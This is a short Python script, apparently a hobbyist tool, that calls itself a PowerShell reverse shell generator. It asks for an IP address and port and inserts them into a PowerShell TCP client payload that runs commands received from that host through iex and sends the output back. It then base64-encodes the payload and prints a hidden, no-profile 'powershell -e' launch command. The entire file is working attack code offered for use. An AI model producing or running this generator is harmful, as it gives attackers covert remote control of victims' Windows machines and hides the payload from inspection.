import sys
import base64

ascii_art = """
#############################################################
# ____                            _          _ _            #
#|  _ \ _____      _____ _ __ ___| |__   ___| | |           #
#| |_) / _ \ \ /\ / / _ \ '__/ __| '_ \ / _ \ | |           #
#|  __/ (_) \ V  V /  __/ |  \__ \ | | |  __/ | |           #
#|_|__ \___/ \_/\_/ \___|_|  |___/_| |_|\___|_|_|      _ _  #
#|  _ \ _____   _____ _ __ ___  ___  / ___|| |__   ___| | | #
#| |_) / _ \ \ / / _ \ '__/ __|/ _ \ \___ \| '_ \ / _ \ | | #
#|  _ <  __/\ V /  __/ |  \__ \  __/  ___) | | | |  __/ | | #
#|_|_\_\___| \_/ \___|_|  |___/\___| |____/|_| |_|\___|_|_| #
# / ___| ___ _ __   ___ _ __ __ _| |_ ___  _ __             #
#| |  _ / _ \ '_ \ / _ \ '__/ _` | __/ _ \| '__|            #
#| |_| |  __/ | | |  __/ | | (_| | || (_) | |               #
# \____|\___|_| |_|\___|_|  \__,_|\__\___/|_|               #
#############################################################
"""

print(ascii_art)

print("Brought to you by: Brian \n")

# Get user input for IP address and port
ip_address = input("Enter your IP address: ")
port = input("Enter a port: ")

# Payload with placeholders replaced by user input
payload = f'$client = New-Object System.Net.Sockets.TCPClient("{ip_address}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'

# Encode the payload
encoded_payload = base64.b64encode(payload.encode('utf-16')[2:]).decode()

# Construct the command
cmd = "powershell -nop -w hidden -e " + encoded_payload

# Print the command
print(cmd)
